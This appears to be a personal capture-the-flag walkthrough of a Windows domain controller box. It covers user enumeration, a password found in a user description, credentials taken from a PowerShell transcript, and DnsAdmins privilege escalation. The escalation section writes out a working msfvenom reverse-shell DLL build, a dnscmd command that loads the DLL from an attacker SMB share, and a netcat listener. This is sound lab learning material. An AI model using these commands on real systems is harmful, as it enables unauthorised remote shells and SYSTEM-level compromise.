#rpcclient #querydispinfo #cme #password-spray #powershell-transcripts #user-descriptions #dnsadmins #dll-injection

>[!code]- Find open ports
>
>![Pasted image 20240831103518](/Images/Pasted%20image%2020240831103518.png)
>![Pasted image 20240831103540](/Images/Pasted%20image%2020240831103540.png)
#### Foothold

>[!code]- Enumerate users via **rpcclient** and find that **marko** user has a description which suggests their password is set to **Welcome123!**
>
>![Pasted image 20240831112156](/Images/Pasted%20image%2020240831112156.png)

>[!fail]- marko:Welcome123! doesn't work

>[!code]- Find that **melanie** user has password **Welcome123!**
>
>![Pasted image 20240831113908](/Images/Pasted%20image%2020240831113908.png)
#### Access

>[!success]- Obtain a shell as **melanie** and obtain user.txt
>
>![Pasted image 20240901061220](/Images/Pasted%20image%2020240901061220.png)

>[!code]- Find a PowerShell transcript file containing a password for the user **ryan** (Serv3r4Admin4cc123!)
>Find the powershell transcript file:
>
>![Pasted image 20240901061002](/Images/Pasted%20image%2020240901061002.png)
>
>Find the credentials:
>
>![Pasted image 20240901061415](/Images/Pasted%20image%2020240901061415.png)

>[!success]- Obtain a shell as **ryan**
>
>![Pasted image 20240901061538](/Images/Pasted%20image%2020240901061538.png)
#### Privilege Escalation

>[!code]- Find that ryan is a member of the **DnsAdmins** group
>
>![Pasted image 20240901064548](/Images/Pasted%20image%2020240901064548.png)

>[!code]- Exploit DnsAdmins permissions by executing a malicious DLL upon DNS service startup
>###### Create the DLL
>```powershell
>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f dll > rev.dll
>```
>![Pasted image 20240901070858](/Images/Pasted%20image%2020240901070858.png)
>
>###### Link the DLL to the DNS service
>```powershell
>dnscmd.exe /config /serverlevelplugindll \\10.10.14.13\share\rev.dll
>```
>![Pasted image 20240902081424](/Images/Pasted%20image%2020240902081424.png)
>###### Make the DLL reachable
>```powershell
># On Kali (in folder containing rev.dll)
>impacket-smbserver share .
>
># Create a listener
>rlwrap nc -lvnp 9001
>```
>![Pasted image 20240902081452](/Images/Pasted%20image%2020240902081452.png)
>###### Stop and start and DNS service
>```powershell
>sc.exe stop dns
>sc.exe start dns
>```
>![Pasted image 20240902081524](/Images/Pasted%20image%2020240902081524.png)

>[!success]- Obtain shell as NT AUTHORITY\SYSTEM and obtain root.txt
>
>![Pasted image 20240902081613](/Images/Pasted%20image%2020240902081613.png)




